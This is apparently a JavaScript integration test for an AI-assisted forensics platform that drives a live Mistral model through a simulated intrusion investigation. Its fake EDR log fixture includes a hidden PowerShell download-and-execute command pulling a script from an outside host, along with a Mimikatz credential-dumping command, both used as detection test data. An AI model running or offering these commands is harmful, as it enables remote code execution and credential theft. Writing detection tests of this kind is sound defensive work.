/**
 * TRACE AI - Comprehensive Live AI Integration Verification Suite
 * Verifies live Ollama inference with mistral:latest against the LangGraph Engine.
 * NO deterministic mocks for the live run.
 */

const mongoose = require('mongoose');
const { runInvestigationWorkflow, getInvestigationRunById, listInvestigationRuns } = require('../services/investigationWorkflow.service');
const { checkReadiness, OLLAMA_MODEL } = require('../services/ollama.service');
const Case = require('../models/Case');
const Evidence = require('../models/Evidence');
const IOC = require('../models/IOC');
const TimelineEvent = require('../models/TimelineEvent');
const MitreMapping = require('../models/MitreMapping');
const InvestigationRun = require('../models/InvestigationRun');
const AuditLog = require('../models/AuditLog');

const BASE_URL = 'http://localhost:5000/api';
const MONGO_URI = 'mongodb://127.0.0.1:27017/arclight_dfir';

let passedChecks = 0;
let failedChecks = 0;

function assertCheck(name, condition, detail = '') {
  if (condition) {
    console.log(`[PASS] ${name}${detail ? ` -> ${detail}` : ''}`);
    passedChecks++;
  } else {
    console.error(`[FAIL] ${name}${detail ? ` -> ${detail}` : ''}`);
    failedChecks++;
  }
}

async function runLiveVerification() {
  console.log('======================================================================');
  console.log('TRACE AI - LIVE MISTRAL AI INTEGRATION VERIFICATION SUITE');
  console.log('Model Target:', OLLAMA_MODEL);
  console.log('API Base URL:', BASE_URL);
  console.log('Database URI:', MONGO_URI);
  console.log('======================================================================\n');

  await mongoose.connect(MONGO_URI);

  // -------------------------------------------------------------------------
  // Check 1: Authentication & Authorization Enforcement
  // -------------------------------------------------------------------------
  console.log('\n--- Section 1: Authentication & Authorization ---');
  let token = null;
  let authHeaders = {};

  // Test unauthenticated access rejected
  const unauthRes = await fetch(`${BASE_URL}/ai/readiness`);
  assertCheck('Unauthenticated GET /api/ai/readiness returns 401', unauthRes.status === 401, `Status: ${unauthRes.status}`);

  const unauthInvestigateRes = await fetch(`${BASE_URL}/ai/investigate`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ caseId: 'CASE-UNAUTH' })
  });
  assertCheck('Unauthenticated POST /api/ai/investigate returns 401', unauthInvestigateRes.status === 401, `Status: ${unauthInvestigateRes.status}`);

  // Login as CSO
  const loginRes = await fetch(`${BASE_URL}/auth/login`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email: 'cso@trace.ai', password: 'clearancepassword123' })
  });
  const loginData = await loginRes.json();
  token = loginData.token || loginData.data?.token;
  authHeaders = { Authorization: `Bearer ${token}` };
  assertCheck('Operator login and token acquisition', loginRes.status === 200 && !!token);

  // -------------------------------------------------------------------------
  // Check 2: Ollama Readiness & Model Availability
  // -------------------------------------------------------------------------
  console.log('\n--- Section 2: Ollama Readiness & Model Status ---');
  const readinessRes = await fetch(`${BASE_URL}/ai/readiness`, { headers: authHeaders });
  const readinessData = await readinessRes.json();
  const rData = readinessData.data;

  assertCheck('Readiness endpoint status 200', readinessRes.status === 200);
  assertCheck('Readiness reports ONLINE', rData?.status === 'ONLINE', `Status: ${rData?.status}`);
  assertCheck('Readiness reports ready=true', rData?.ready === true, `Ready: ${rData?.ready}`);
  assertCheck('Configured model is mistral:latest', rData?.model === 'mistral:latest', `Model: ${rData?.model}`);
  assertCheck('Available models include mistral:latest', (rData?.availableModels || []).includes('mistral:latest'));

  // -------------------------------------------------------------------------
  // Check 3: Create Incident Case and Ingest Telemetry
  // -------------------------------------------------------------------------
  console.log('\n--- Section 3: Case Creation & Telemetry Ingestion ---');
  const caseRes = await fetch(`${BASE_URL}/cases`, {
    method: 'POST',
    headers: { ...authHeaders, 'Content-Type': 'application/json' },
    body: JSON.stringify({
      title: 'Live AI Mimikatz Lateral Movement Incident',
      description: 'Host telemetry indicates brute force followed by admin session and Mimikatz credential dumping.',
      severity: 'Critical'
    })
  });
  const caseData = await caseRes.json();
  const caseId = caseData.data?.caseId;
  assertCheck('Case created', caseRes.status === 201 && !!caseId, `CaseId: ${caseId}`);

  // Ingest Evidence
  const formData = new FormData();
  formData.append('caseId', caseId);
  formData.append('batchId', `BATCH-LIVE-E2E-${Date.now()}`);

  const authLogContent = [
    '2026-09-30T21:00:10Z host-app01 sshd[4401]: Failed password for invalid user root from 198.51.100.25 port 48912 ssh2',
    '2026-09-30T21:00:14Z host-app01 sshd[4403]: Failed password for invalid user admin from 198.51.100.25 port 48918 ssh2',
    '2026-09-30T21:00:20Z host-app01 sshd[4407]: Accepted password for secops_admin from 198.51.100.25 port 48922 ssh2'
  ].join('\n');

  const edrLogContent = [
    '{"timestamp":"2026-09-30T21:05:00Z","host":"host-app01","user":"secops_admin","process":"powershell.exe","cmdline":"powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command IEX(New-Object Net.WebClient).DownloadString(\'http://203.0.113.50/m.ps1\')"}',
    '{"timestamp":"2026-09-30T21:06:12Z","host":"host-app01","user":"secops_admin","process":"mimikatz.exe","cmdline":"mimikatz.exe privilege::debug sekurlsa::logonpasswords exit"}'
  ].join('\n');

  formData.append('relativePaths', JSON.stringify(['auth_service.log', 'edr_sysmon.jsonl']));
  formData.append('files', new Blob([authLogContent], { type: 'text/plain' }), 'auth_service.log');
  formData.append('files', new Blob([edrLogContent], { type: 'text/plain' }), 'edr_sysmon.jsonl');

  const evRes = await fetch(`${BASE_URL}/evidence/upload`, {
    method: 'POST',
    headers: authHeaders,
    body: formData
  });
  const evData = await evRes.json();
  const evidenceList = evData.data || [];
  assertCheck('Evidence uploaded', evRes.status === 201 && evidenceList.length === 2, `Count: ${evidenceList.length}`);

  // Pre-seed IOC, Timeline, and MITRE
  const iocRes = await fetch(`${BASE_URL}/ioc/detect`, {
    method: 'POST',
    headers: { ...authHeaders, 'Content-Type': 'application/json' },
    body: JSON.stringify({ caseId })
  });
  assertCheck('IOC detection executed', iocRes.status === 200);

  const tlRes = await fetch(`${BASE_URL}/timeline/generate`, {
    method: 'POST',
    headers: { ...authHeaders, 'Content-Type': 'application/json' },
    body: JSON.stringify({ caseId })
  });
  const tlData = await tlRes.json();
  assertCheck('Timeline generated', tlRes.status === 200 && tlData.data?.totalEvents > 0, `Events: ${tlData.data?.totalEvents}`);

  const mitreRes = await fetch(`${BASE_URL}/mitre/generate`, {
    method: 'POST',
    headers: { ...authHeaders, 'Content-Type': 'application/json' },
    body: JSON.stringify({ caseId })
  });
  const mitreData = await mitreRes.json();
  assertCheck('MITRE mapping generated', mitreRes.status === 200 && mitreData.data?.totalMapped > 0, `Mapped: ${mitreData.data?.totalMapped}`);

  // -------------------------------------------------------------------------
  // Check 4: REAL LangGraph AI Investigation Execution (NO MOCKS)
  // -------------------------------------------------------------------------
  console.log('\n--- Section 4: Live LangGraph AI Investigation Execution ---');
  console.log('Sending live prompt to mistral:latest via LangGraph workflow...');

  const t0 = Date.now();
  const liveRun = await runInvestigationWorkflow(caseId, {
    user: { username: 'Chief Security Officer', email: 'cso@trace.ai' },
    timeoutMs: 360000 // 6 minutes for CPU execution
  });
  const durationSec = ((Date.now() - t0) / 1000).toFixed(1);
  console.log(`Live inference completed in ${durationSec}s!`);

  assertCheck('LangGraph execution completed with status completed', liveRun.status === 'completed', `Status: ${liveRun.status}`);
  assertCheck('Model used is mistral:latest', liveRun.model === 'mistral:latest', `Model: ${liveRun.model}`);
  assertCheck('Workflow version is LangGraph-DFIR-v1.0', liveRun.workflowVersion === 'LangGraph-DFIR-v1.0');

  // Verify Real Model Generates all 5 required elements:
  // 1. Investigation Summary
  assertCheck('Real model generated investigation summary',
    typeof liveRun.executiveSummary === 'string' && liveRun.executiveSummary.trim().length > 20,
    `Summary length: ${liveRun.executiveSummary?.length} chars`
  );

  // 2. Candidate Hypotheses
  assertCheck('Real model generated candidate hypotheses',
    Array.isArray(liveRun.hypotheses) && liveRun.hypotheses.length >= 1,
    `Hypotheses count: ${liveRun.hypotheses?.length}`
  );

  // 3. Attack Narrative
  assertCheck('Real model generated attack narrative',
    typeof liveRun.candidateNarrative === 'string' && liveRun.candidateNarrative.trim().length > 20,
    `Narrative length: ${liveRun.candidateNarrative?.length} chars`
  );

  // 4. Evidence Gaps
  assertCheck('Real model generated evidence gaps',
    Array.isArray(liveRun.evidenceGaps) && liveRun.evidenceGaps.length >= 1,
    `Gaps: ${JSON.stringify(liveRun.evidenceGaps)}`
  );

  // 5. Follow-up Recommendations
  assertCheck('Real model generated follow-up recommendations',
    Array.isArray(liveRun.suggestedFollowUps) && liveRun.suggestedFollowUps.length >= 1,
    `Follow-ups: ${JSON.stringify(liveRun.suggestedFollowUps)}`
  );

  // -------------------------------------------------------------------------
  // Check 5: Evidence & Timeline References Verification
  // -------------------------------------------------------------------------
  console.log('\n--- Section 5: Provenance & Evidence ID Validation ---');
  const validEvIds = new Set(evidenceList.map(e => e.evidenceId));
  const validTlEvents = await TimelineEvent.find({ caseId }).select('eventId');
  const validTlIds = new Set(validTlEvents.map(t => t.eventId));

  let allEvidenceRefsValid = true;
  let allTimelineRefsValid = true;

  liveRun.hypotheses.forEach((hyp, idx) => {
    hyp.supportingEvidenceIds?.forEach(id => {
      if (!validEvIds.has(id)) allEvidenceRefsValid = false;
    });
    hyp.supportingTimelineEventIds?.forEach(id => {
      if (!validTlIds.has(id)) allTimelineRefsValid = false;
    });
    console.log(`  Hypothesis ${idx + 1}: "${hyp.title}"`);
    console.log(`    - Classification: ${hyp.classification}`);
    console.log(`    - Confidence: ${hyp.confidence?.score}% (${hyp.confidence?.level})`);
    console.log(`    - Supporting Evidence: ${JSON.stringify(hyp.supportingEvidenceIds)}`);
    console.log(`    - Supporting Timeline: ${JSON.stringify(hyp.supportingTimelineEventIds)}`);
  });

  assertCheck('All hypothesis evidence references match actual case evidence IDs', allEvidenceRefsValid);
  assertCheck('All hypothesis timeline references match actual case timeline IDs', allTimelineRefsValid);

  // -------------------------------------------------------------------------
  // Check 6: Hallucinated / Fabricated Reference Rejection Test
  // -------------------------------------------------------------------------
  console.log('\n--- Section 6: Hallucination & Fabrication Defense ---');
  // Pass a mock generator with fabricated references to verify the validator strictly rejects them
  const fabricationMock = async () => {
    return JSON.stringify({
      executiveSummary: 'Fabrication test summary',
      candidateNarrative: 'Fabrication test narrative',
      hypotheses: [
        {
          title: 'Valid Hypothesis',
          statement: 'Valid evidence reference.',
          classification: 'observed_fact',
          confidenceScore: 85,
          supportingEvidenceIds: [evidenceList[0].evidenceId],
          supportingTimelineEventIds: []
        },
        {
          title: 'Hallucinated Reference Hypothesis',
          statement: 'Fabricated reference that does not exist in the case.',
          classification: 'inferred_hypothesis',
          confidenceScore: 60,
          supportingEvidenceIds: ['EVD-FABRICATED-99999'],
          supportingTimelineEventIds: ['TLE-FABRICATED-88888']
        },
        {
          title: 'Zero Reference Unsupported Speculation',
          statement: 'No evidence provided.',
          classification: 'inferred_hypothesis',
          confidenceScore: 40,
          supportingEvidenceIds: [],
          supportingTimelineEventIds: []
        }
      ],
      evidenceGaps: [],
      suggestedFollowUps: []
    });
  };

  const fabricationRun = await runInvestigationWorkflow(caseId, {
    mockGenerator: fabricationMock
  });

  assertCheck('Validator accepted legitimate hypothesis', fabricationRun.hypotheses.length === 1);
  assertCheck('Validator rejected 2 unsupported/fabricated hypotheses', fabricationRun.rejectedHypotheses.length === 2);
  const fakeRefRejected = fabricationRun.rejectedHypotheses.some(r =>
    r.rejectionReason.includes('EVD-FABRICATED-99999') || r.rejectionReason.includes('TLE-FABRICATED-88888')
  );
  assertCheck('Validator recorded specific rejection reason with fabricated ID', fakeRefRejected);

  // -------------------------------------------------------------------------
  // Check 7: MongoDB Persistence Verification
  // -------------------------------------------------------------------------
  console.log('\n--- Section 7: MongoDB Direct Persistence ---');
  const persistedRun = await InvestigationRun.findOne({ runId: liveRun.runId }).lean();
  assertCheck('InvestigationRun persisted in MongoDB (arclight_dfir)', !!persistedRun);
  assertCheck('Persisted runId matches live run', persistedRun?.runId === liveRun.runId);
  assertCheck('Persisted status is completed', persistedRun?.status === 'completed');
  assertCheck('Persisted model is mistral:latest', persistedRun?.model === 'mistral:latest');
  assertCheck('Persisted hypotheses count matches live run', persistedRun?.hypotheses?.length === liveRun.hypotheses.length);

  // -------------------------------------------------------------------------
  // Check 8: AuditLog Persistence Verification
  // -------------------------------------------------------------------------
  console.log('\n--- Section 8: Audit Logging Persistence ---');
  const auditDoc = await AuditLog.findOne({
    action: 'AI_INVESTIGATION_RUN',
    description: { $regex: liveRun.runId }
  }).lean();
  assertCheck('AuditLog entry persisted in MongoDB', !!auditDoc);
  assertCheck('AuditLog action is AI_INVESTIGATION_RUN', auditDoc?.action === 'AI_INVESTIGATION_RUN');
  assertCheck('AuditLog status is Success', auditDoc?.status === 'Success');
  assertCheck('AuditLog description contains runId and caseId',
    auditDoc?.description.includes(liveRun.runId) && auditDoc?.description.includes(caseId)
  );

  // -------------------------------------------------------------------------
  // Check 9: Case Isolation Enforcement
  // -------------------------------------------------------------------------
  console.log('\n--- Section 9: Case Isolation & Tenant Boundary ---');
  // Create Case B
  const caseBRes = await fetch(`${BASE_URL}/cases`, {
    method: 'POST',
    headers: { ...authHeaders, 'Content-Type': 'application/json' },
    body: JSON.stringify({
      title: 'Isolated Tenant Boundary Case B',
      description: 'Separate isolated case.',
      severity: 'Low'
    })
  });
  const caseBData = await caseBRes.json();
  const caseIdB = caseBData.data?.caseId;

  // Run list API for Case B
  const runsBRes = await fetch(`${BASE_URL}/ai/runs?caseId=${caseIdB}`, { headers: authHeaders });
  const runsBData = await runsBRes.json();
  assertCheck('Case B has 0 runs initially (no leakage from Case A)', runsBData.data?.items?.length === 0);

  // Query evidence for liveRun does not include Case B
  const evRunsRes = await fetch(`${BASE_URL}/ai/runs/${liveRun.runId}/evidence`, { headers: authHeaders });
  const evRunsData = await evRunsRes.json();
  const allBelongToCaseA = Array.isArray(evRunsData.data?.evidenceItems) &&
    evRunsData.data.evidenceItems.length > 0 &&
    evRunsData.data.evidenceItems.every(e => e.caseId === caseId);
  assertCheck('All referenced evidence belongs strictly to Case A', allBelongToCaseA);

  // -------------------------------------------------------------------------
  // Summary
  // -------------------------------------------------------------------------
  console.log('\n======================================================================');
  console.log('LIVE VERIFICATION SUMMARY');
  console.log('======================================================================');
  console.log(`Total Checks Executed: ${passedChecks + failedChecks}`);
  console.log(`Passed: ${passedChecks}`);
  console.log(`Failed: ${failedChecks}`);
  console.log('======================================================================\n');

  await mongoose.disconnect();

  if (failedChecks > 0) {
    console.error(`>>> LIVE VERIFICATION FAILED WITH ${failedChecks} ERRORS <<<`);
    process.exit(1);
  } else {
    console.log('>>> ALL LIVE AI INTEGRATION VERIFICATION CHECKS PASSED SUCCESSFULLY! <<<\n');
    process.exit(0);
  }
}

runLiveVerification().catch(err => {
  console.error('\n>>> UNEXPECTED ERROR IN LIVE VERIFICATION <<<');
  console.error(err);
  process.exit(1);
});
